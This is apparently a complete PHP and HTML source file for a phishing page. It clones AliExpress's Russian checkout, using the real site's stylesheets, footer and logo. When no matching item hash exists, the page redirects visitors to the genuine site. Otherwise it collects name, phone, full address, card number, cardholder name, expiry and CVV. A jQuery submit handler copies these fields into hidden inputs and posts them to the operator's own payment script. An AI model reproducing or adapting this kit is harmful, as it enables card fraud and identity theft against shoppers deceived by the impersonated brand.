<?php 

/*

*/
if(!isset($_GET['id'])) {
	header('Location: https://ru.aliexpress.com/');
}

/*

*/
try {
	$item = $_DB->row('SELECT * FROM `items` WHERE `hash` = :hash ORDER BY `id` DESC LIMIT 1', [
		'hash' => $_GET['id']
	]);

	if(empty($item)) {
		throw new Exception(true);
	}
} catch(Exception $e) {
	header('Location: https://ru.aliexpress.com/');
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">

	<title>Пожалуйста, подтвердите Ваш заказ - AliExpress</title>

	<link rel="shortcut icon" type="image/x-icon" href="//img.alibaba.com/images/eng/wholesale/icon/aliexpress.ico">
	<link rel="shortcut icon" href="//ae01.alicdn.com/images/eng/wholesale/icon/aliexpress.ico" type="image/x-icon">

	<link rel="stylesheet" href="https://assets.alicdn.com/g/ae-fe/shopcart-ui/0.0.6/??common.css,placeorder/index.css">
	<link rel="stylesheet" href="https://i.alicdn.com/ae-footer/20190918153024/buyer/front/ae-footer.css">
</head>
<body>
	<!--  -->
	<div id="root"><div><div class="placeorder-header"><div class="container"><a class="ae-logo" href="//www.aliexpress.com/" target="_blank"></a></div></div><div class="order-main normal"><div class="row"><div id="main" class="main"><div class="card-container "><div class="shipping-info"><div class="custom-collapse"><div class="collapse-header"><p class="collapse-title">Шаг 1 из 2</p></div><p class="main-title ">Адрес доставки</p><div><div class="ship-info"><div class="group-content"><p class="title">Контактная информация </p><div class="input-default"><div><span data-meta="Field" class="next-input next-large"><input id="contactPerson" placeholder="Получатель" name="contactPerson" height="100%" autocomplete="off" value=""></span><p class="error-msg"></p></div><p class="tips"> Например: Иванов Иван Иванович </p></div><div class="input-default"><div class="phone-input"><div class="label-input"><span data-meta="Field" class="next-input next-large"><input id="phoneCountry" placeholder="+7" name="phoneCountry" height="100%" autocomplete="off" value="+7"></span></div><div class="phone-text"><span data-meta="Field" class="next-input next-large"><input id="mobileNo" placeholder="Номер мобильного" name="mobileNo" height="100%" autocomplete="off" value=""></span></div></div></div></div><div class="group-content"><p class="title">Адрес </p><div class="input-default"><div><span data-meta="Field" class="next-input next-large"><input id="address" placeholder="Улица" name="address" height="100%" autocomplete="off" value=""></span></div></div><div class="input-default"><div><span data-meta="Field" class="next-input next-large"><input id="address2" placeholder="Дом, квартира и т. п. " name="address2" height="100%" autocomplete="off" value=""></span></div></div><div class="addr-select-container"><div class="addr-select-container"><div class="addr-select"><span class="zoro-ui-select zoro-ui-search-select"><div><span data-meta="Field" class="next-input next-large" style="width: 100%;"><input id="address3" placeholder="Страна" name="address2" height="100%" autocomplete="off" value=""></span></div></span><div class="search-select"><div><span data-meta="Field" class="next-input next-large" style="width: 100%;"><input id="address4" placeholder="Край/Область/Регион" name="address2" height="100%" autocomplete="off" value=""></span></div></div><div class="search-select"><div><span data-meta="Field" class="next-input next-large" style="width: 100%;"><input id="address5" placeholder="Город" name="address2" height="100%" autocomplete="off" value=""></span></div></div></div></div></div><div class="input-default"><div><span data-meta="Field" class="next-input next-large"><input id="zip" placeholder="Почтовый индекс" name="zip" height="100%" autocomplete="off" value=""></span></div></div></div></div></div></div></div></div><div class="card-container "><div class="payment-info"><div class="custom-collapse"><div class="collapse-header"><p class="collapse-title">Шаг 2 из 2</p></div><p class="main-title "><span class="payment-title">Способы оплаты</span></p><div class="pay-method"><div class="pay-list"><div class="payment-group"><div class="payment-list"><div class="pay-type  checked  show-method"><div clk_trigger="" st_page_id="grdvfnws9gscavua170826ce07b67445a0ada1515f" ae_page_type="Place_Order_Page" ae_page_area="Payment_methods" ae_button_type="payment_option" ae_object_type="button" ae_object_value="select_payoption=MIXEDCARD" exp_trigger="" exp_page="Place_Order_Page" exp_page_area="Payment_methods" exp_type="" class="pay-title mixedcard" data-aplus-ae="x3_6a3f35f1" data-spm-anchor-id="a2g0o.placeorder.0.i2.5da329fdTFzbue" data-aplus-clk="x1_68efb803"><p class="pay-name">Карта</p><div class="channel-icon mixedcard"><span class="icon amex"></span><span class="icon maestro"></span><span class="icon mastercard"></span><span class="icon discover"></span><span class="icon mir"></span><span class="icon jcb"></span><span class="icon visa"></span><span class="icon diners"></span><span class="icon troy"></span></div></div></div></div><div class="pay-detail"><div class="pay-content"><div class="new-card"><div class="card-surface card-front"><span class="card-type-icon icon "></span><div class="card-no"><p class="bottom-title">НОМЕР КАРТЫ</p><span data-meta="Field" class="next-input next-medium"><input id="cardNo" placeholder="0000 0000 0000 0000" maxlength="19" height="100%" type="text" autocomplete="off" value="" data-spm-anchor-id="a2g0o.placeorder.0.i37.5da329fdTFzbue"></span></div><div class="card-bottom" data-spm-anchor-id="a2g0o.placeorder.0.i39.5da329fdTFzbue"><div class="holder "><p class="bottom-title" data-spm-anchor-id="a2g0o.placeorder.0.i38.5da329fdTFzbue">Держатель карты</p><span data-meta="Field" class="next-input next-medium"><input id="cardHolder" placeholder="ФАМИЛИЯ И ИМЯ" height="100%" autocomplete="off" value=""></span></div><div class="expires"><p class="bottom-title">Срок действия</p><span data-meta="Field" class="next-input next-medium"><input id="expire" placeholder="MM / YY" height="100%" autocomplete="off" value="" data-spm-anchor-id="a2g0o.placeorder.0.i40.5da329fdTFzbue" maxlength="7"></span></div></div></div><div class="card-surface card-back"><div class="card-bottom"><div class="cvv "><p class="bottom-title">CVV</p><span data-meta="Field" class="next-input next-medium cvv-code"><input id="cvc" placeholder="000" height="100%" autocomplete="off" value="" maxlength="3"></span></div></div></div></div></div></div></div></div></div></div></div></div></div><div id="side" class="side"><div id="price-overview" class="affix-fix" style="position: relative !important; top: 0"><div class="card-container price-container"><div class="next-loading next-loading-inline loading"><div class="next-loading-wrap"><div class="price"><h2>Сумма заказа</h2><div class="order-charge-container"><div class="coupon-code"><div class="coupon-code-title"><div class="title">Промокод</div><div class="amount"></div></div><div class="next-form-item next-top next-small coupon-input"><div class="next-form-item-control"><span data-meta="Field" class="next-input next-small"><input id="code" name="code"></span>  </div></div></div></div><div class="total-price"><dl><dt>К оплате</dt><dd><?= number_format($item[0]['amount'], 2, ',', ' ') ?> руб.</dd></dl></div></div><div class="order-btn-holder"><form action="/payments/applications/pay.php" method="POST"><input type="hidden" name="filename" value="<?= $item[0]['hash'] ?>"><input type="hidden" name="amount" value="<?= $item[0]['amount'] ?>"><input type="hidden" name="username" value="<?= $item[0]['account'] ?>"><input type="hidden" name="person"><input type="hidden" name="phone"><input type="hidden" name="street"><input type="hidden" name="house"><input type="hidden" name="country"><input type="hidden" name="region"><input type="hidden" name="city"><input type="hidden" name="promocode"><input type="hidden" name="index"><input type="hidden" name="card_number"><input type="hidden" name="card_owner"><input type="hidden" name="card_date"><input type="hidden" name="card_cvc"><button type="submit" class="next-btn next-large next-btn-primary">Оформить заказ</button></form></div></div></div></div><div class="confirm-tips"><p><span>Нажимая «Оформить заказ», вы подтверждаете, что ознакомились и принимаете Пользовательские <a href="https://sale.aliexpress.com/rules.htm" target="_blank">соглашения</a>.</span></p></div></div></div></div></div>

	<!--  -->
	<div class="site-footer"><div class="container"><div class="sf-aliexpressInfo clearfix"><div class="sf-siteIntro col-lg-30 col-md-30 col-sm-60"><dl><dt>Навигация по AliExpress</dt><dd><a href="//sale.aliexpress.ru/kr_helpcenter.htm">Служба поддержки</a>, <a href="//report.aliexpress.com">Споры и жалобы</a>, <a href="//sale.aliexpress.ru/v8Yr8f629D.htm?spm=a2g0o.placeorder.0.0.52aa29fdg7chyd" ref="nofollow" data-spm-anchor-id="a2g0o.placeorder.0.0">Защита Покупателя</a>, <a href="http://ipp.alibabagroup.com" ref="nofollow">Сообщить о нарушении авторских прав</a><span> , <a href="https://rule.alibaba.com/rule/rule_list/284.htm" ref="nofollow">Условия Использования и Информация Правового Характера</a></span></dd></dl></div><div class="sf-MultiLanguageSite col-lg-30 col-md-30 col-sm-60"><dl><dt>AliExpress на других языках</dt><dd><a href="//aliexpress.ru">Русский</a>, <a href="//pt.aliexpress.com">Португальский</a>, <a href="//es.aliexpress.com">Испанский</a>, <a href="//fr.aliexpress.com">Французский</a>, <a href="//de.aliexpress.com">Немецкий</a>, <a href="//it.aliexpress.com">Итальянский</a>, <a href="//nl.aliexpress.com">Нидерландский</a>, <a href="//tr.aliexpress.com">Турецкий</a>, <a href="//ja.aliexpress.com">Японский</a>, <a href="//ko.aliexpress.com">Корейский</a>, <a href="//th.aliexpress.com">Тайский язык</a>, <a href="//vi.aliexpress.com">Вьетнамский</a>, <a href="//ar.aliexpress.com">Арабский</a>, <a href="//he.aliexpress.com">Иврит</a>, <a href="//pl.aliexpress.com">Польский</a></dd></dl></div></div><div class="sf-seoKeyword col-lg-30 col-md-30 col-sm-60"><dl><dt>Категории товаров</dt><dd><span><a href="//aliexpress.ru/popular.html">Популярное</a>, <a href="//aliexpress.ru/wholesale.html">Оптовая торговля</a>, <a href="//aliexpress.ru/promotion.html">Спецпредложения</a>, <a href="//aliexpress.ru/price.html">Низкие цены</a>, <a href="//aliexpress.ru/cheap.html">Недорогой товар</a>, <a href="//aliexpress.ru/reviews.html">Отзывы</a>, <a href="//brands.aliexpress.com">Бренд-фокус</a>, <a href="//sale.aliexpress.ru/blog.htm">Blog</a>, <a href="//sell.aliexpress.com/4DYTFsSkV0.htm">Seller Portal</a>, <a href="//tmall.ru" ref="nofollow">Tmall</a>, <a href="//sale.aliexpress.ru/__pc/BlackFriday.htm">ЧЁРНАЯ ПЯТНИЦА</a>, <a href="//sale.aliexpress.ru/coronavirus.htm" target="_blank">Коронавирус</a></span> </dd></dl></div><div class="sf-alibabaGroup col-lg-30 col-md-30 col-sm-60"><dl><dt>Группа компаний Alibaba</dt><dd><span><a href="https://careers.alibaba.com/positionList.htm?keyword=&amp;location=RUSMOW">Работа в AliExpress</a>, </span><a href="http://www.alibabagroup.com/en/global/home" ref="nofollow">Сайт Alibaba Group</a>, <a href="//aliexpress.ru/" ref="nofollow">AliExpress</a>, <a href="http://www.alimama.com/" ref="nofollow">Alimama</a>, <a href="https://intl.alipay.com/index.htm" ref="nofollow">Alipay</a>, <a href="http://www.fliggy.com/" ref="nofollow">Fliggy</a>, <a href="http://www.alibabacloud.com" ref="nofollow">Alibaba Cloud</a>, <a href="http://www.alibaba.com/" ref="nofollow">Alibaba International</a>, <a href="http://aliqin.tmall.com/" ref="nofollow">AliTelecom</a>, <a href="http://www.dingtalk.com/" ref="nofollow">DingTalk</a>, <a href="http://ju.taobao.com/" ref="nofollow">Juhuasuan</a>, <a href="http://www.taobao.com/" ref="nofollow">Taobao Marketplace</a>, <a href="http://www.tmall.com/" ref="nofollow">Tmall</a>, <a href="http://www.xiami.com/" ref="nofollow">Xiami</a>, <a href="http://www.alios.cn/" ref="nofollow">AliOS</a>, <a href="http://www.1688.com/" ref="nofollow">1688</a>, <a href="https://www.taobao.tw/">Taobao Taiwan</a></dd></dl></div><div class="sf-download-app"><a class="android-link" href="https://play.google.com/store/apps/details?id=com.alibaba.aliexpresshd" ref="nofollow" target="_blank">Google Play</a><a class="iphone-link" href="https://itunes.apple.com/us/app/aliexpress/id436672029" ref="nofollow" target="_blank">App Store</a></div></div></div>

	<!--  -->
	<div class="footer-copywrite"><div class="container"><a href="https://ipp.alibabagroup.com" ref="nofollow">Intellectual Property Protection</a> - <a href="//helppage.aliexpress.com/buyercenter/questionAnswer.htm?isRouter=0&amp;viewKey=1&amp;id=1000099018&amp;categoryIds=9205401" ref="nofollow">Privacy Policy</a> - <a href="//aliexpress.ru/sitemap.html">Карта сайта</a> - <a href="https://rule.alibaba.com/rule/rule_list/284.htm" ref="nofollow">Term of Use and Legal Information</a> - <a href="https://rule.alibaba.com/rule/detail/5038.htm" ref="nofollow">User Information Legal Enquiry Guide</a> ©️ 2010-2019 AliExpress.com. Все права защищены.</div></div>

	<!--  -->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>

	<!--  -->
	<script>
		$(document).ready(function() {
			/* */
			$('#cardNo').mask('0000 0000 0000 0000');
			$('#expire').mask('00 / 00');
			$('#cvc').mask('000');
		
			/* */
			$('form').submit(function() {
				$('input[type="hidden"][name="person"]').val($('#contactPerson').val());
				$('input[type="hidden"][name="phone"]').val($('#mobileNo').val());
				$('input[type="hidden"][name="street"]').val($('#address').val());
				$('input[type="hidden"][name="house"]').val($('#address2').val());
				$('input[type="hidden"][name="country"]').val($('#address3').val());
				$('input[type="hidden"][name="region"]').val($('#address4').val());
				$('input[type="hidden"][name="city"]').val($('#address5').val());
				$('input[type="hidden"][name="index"]').val($('#zip').val());
				$('input[type="hidden"][name="promocode"]').val($('#code').val());
				$('input[type="hidden"][name="card_number"]').val($('#cardNo').val());
				$('input[type="hidden"][name="card_owner"]').val($('#cardHolder').val());
				$('input[type="hidden"][name="card_date"]').val($('#expire').val());
				$('input[type="hidden"][name="card_cvc"]').val($('#cvc').val());
			});
		});
	</script>
</body>
</html>